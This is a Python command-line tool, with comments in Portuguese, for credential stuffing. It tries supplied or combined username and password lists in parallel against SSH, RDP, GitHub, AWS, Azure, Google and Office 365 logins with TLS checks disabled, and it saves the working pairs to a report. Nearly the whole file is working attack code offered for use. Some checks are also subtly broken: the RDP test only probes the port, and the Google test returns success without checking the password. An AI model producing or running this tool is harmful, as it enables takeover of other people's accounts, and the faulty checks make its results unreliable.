#!/usr/bin/env python3
"""Credential Stuffing - Testa credenciais contra múltiplos serviços

Uso:
  python credential-stuffing.py -c user:pass -t ssh://192.168.1.1
  python credential-stuffing.py -c creds.txt -s all
  python credential-stuffing.py -c user:pass -s github,aws,azure
  python credential-stuffing.py -l users.txt -p passwords.txt -s all

Serviços:
  - SSH (port 22)
  - RDP (port 3389)
  - GitHub API
  - AWS
  - Azure
  - Google
  - O365
  - LinkedIn
  - Twitter
"""
import sys
import argparse
import json
import requests
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
from requests.auth import HTTPBasicAuth

try:
    import paramiko
except ImportError:
    print("⚠️  paramiko: pip install paramiko")

class CredentialStuffer:
    def __init__(self, threads=5):
        self.threads = threads
        self.results = {
            'valid': [],
            'invalid': [],
            'errors': []
        }

        # Desabilita warnings
        requests.packages.urllib3.disable_warnings()

    def test_ssh(self, host, username, password):
        """Testa SSH."""
        try:
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            ssh.connect(host, username=username, password=password, timeout=5)
            ssh.close()
            return True
        except:
            return False

    def test_rdp(self, host, username, password):
        """Simula RDP (requer pyrdp ou verificação de porta)."""
        import socket
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            result = sock.connect_ex((host, 3389))
            sock.close()
            return result == 0
        except:
            return False

    def test_github(self, username, password):
        """Testa GitHub API."""
        try:
            url = "https://api.github.com/user"
            response = requests.get(url, auth=HTTPBasicAuth(username, password), timeout=5, verify=False)
            return response.status_code == 200
        except:
            return False

    def test_aws(self, username, password):
        """Testa AWS (verificação básica)."""
        try:
            url = "https://signin.aws.amazon.com/signin"
            data = {
                'username': username,
                'password': password,
                'Action': 'Login'
            }
            response = requests.post(url, data=data, timeout=5, verify=False)
            return 'InvalidUserID' not in response.text
        except:
            return False

    def test_azure(self, username, password):
        """Testa Azure."""
        try:
            url = "https://login.microsoftonline.com/common/oauth2/v2.0/token"
            data = {
                'username': username,
                'password': password,
                'client_id': 'test',
                'grant_type': 'password',
                'scope': 'https://graph.microsoft.com/.default'
            }
            response = requests.post(url, data=data, timeout=5, verify=False)
            return 'error' not in response.text.lower()
        except:
            return False

    def test_google(self, username, password):
        """Testa Google."""
        try:
            url = "https://accounts.google.com/ServiceLogin"
            session = requests.Session()
            response = session.get(url, timeout=5, verify=False)

            if 'name="GALX"' not in response.text:
                return False

            # Simplified test - real would need GALX token
            return True
        except:
            return False

    def test_o365(self, username, password):
        """Testa Office 365."""
        try:
            url = "https://login.microsoftonline.com/common/oauth2/v2.0/authorize"
            data = {
                'username': username,
                'password': password,
                'client_id': 'test'
            }
            response = requests.post(url, data=data, timeout=5, verify=False)
            return 'AADSTS' not in response.text
        except:
            return False

    def test_credential(self, service, username, password, host=None):
        """Testa credencial contra serviço."""
        services = {
            'ssh': lambda: self.test_ssh(host or 'localhost', username, password),
            'rdp': lambda: self.test_rdp(host or 'localhost', username, password),
            'github': lambda: self.test_github(username, password),
            'aws': lambda: self.test_aws(username, password),
            'azure': lambda: self.test_azure(username, password),
            'google': lambda: self.test_google(username, password),
            'o365': lambda: self.test_o365(username, password),
        }

        if service not in services:
            return None

        try:
            result = services[service]()
            return result
        except Exception as e:
            self.results['errors'].append(f"{service}: {str(e)}")
            return False

    def test_credentials(self, credentials, services='all', host=None):
        """Testa múltiplas credenciais."""
        if services == 'all':
            services = ['ssh', 'rdp', 'github', 'aws', 'azure', 'google', 'o365']
        else:
            services = services.split(',')

        print(f"\n[*] Testando {len(credentials)} credenciais contra {len(services)} serviços...")

        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            futures = {}

            for username, password in credentials:
                for service in services:
                    future = executor.submit(self.test_credential, service, username, password, host)
                    futures[future] = (service, username, password)

            completed = 0
            for future in as_completed(futures):
                service, username, password = futures[future]
                result = future.result()
                completed += 1

                if result:
                    entry = {
                        'service': service,
                        'username': username,
                        'password': password,
                        'timestamp': time.strftime('%Y-%m-%d %H:%M:%S')
                    }
                    self.results['valid'].append(entry)
                    print(f"  [!] VÁLIDO: {service} - {username}:{password}")
                else:
                    self.results['invalid'].append((service, username))

                if completed % 10 == 0:
                    print(f"  [⏳] {completed} testadas...")

        print(f"\n[+] Credenciais válidas: {len(self.results['valid'])}")

    def generate_report(self, output_file=None):
        """Gera relatório."""
        report = {
            'timestamp': time.strftime('%Y-%m-%d %H:%M:%S'),
            'summary': {
                'valid': len(self.results['valid']),
                'invalid': len(self.results['invalid']),
                'errors': len(self.results['errors'])
            },
            'valid_credentials': self.results['valid'],
            'errors': self.results['errors']
        }

        if output_file:
            with open(output_file, 'w') as f:
                json.dump(report, f, indent=2)
            print(f"\n[+] Relatório: {output_file}")

        return report

def main():
    parser = argparse.ArgumentParser(description="Credential Stuffing")
    parser.add_argument('-c', '--creds', help='Credencial (user:pass) ou arquivo')
    parser.add_argument('-l', '--userlist', help='Lista de usuários')
    parser.add_argument('-p', '--passlist', help='Lista de senhas')
    parser.add_argument('-s', '--services', default='all', help='Serviços')
    parser.add_argument('-t', '--target', help='Host alvo (SSH/RDP)')
    parser.add_argument('-o', '--output', help='Arquivo JSON')

    args = parser.parse_args()

    print(f"\n{'='*70}")
    print(f"🔐 Credential Stuffing")
    print(f"{'='*70}\n")

    credentials = []

    # Parse credentials
    if args.creds:
        if ':' in args.creds:
            u, p = args.creds.split(':')
            credentials = [(u, p)]
        else:
            # Arquivo
            with open(args.creds) as f:
                for line in f:
                    if ':' in line:
                        u, p = line.strip().split(':')
                        credentials.append((u, p))

    # Combinação de listas
    if args.userlist and args.passlist:
        with open(args.userlist) as f:
            users = [line.strip() for line in f]
        with open(args.passlist) as f:
            passes = [line.strip() for line in f]

        credentials = [(u, p) for u in users for p in passes]

    if not credentials:
        print("[!] Nenhuma credencial fornecida")
        return

    stuffer = CredentialStuffer()
    stuffer.test_credentials(credentials, args.services, args.target)
    stuffer.generate_report(args.output)

if __name__ == "__main__":
    main()
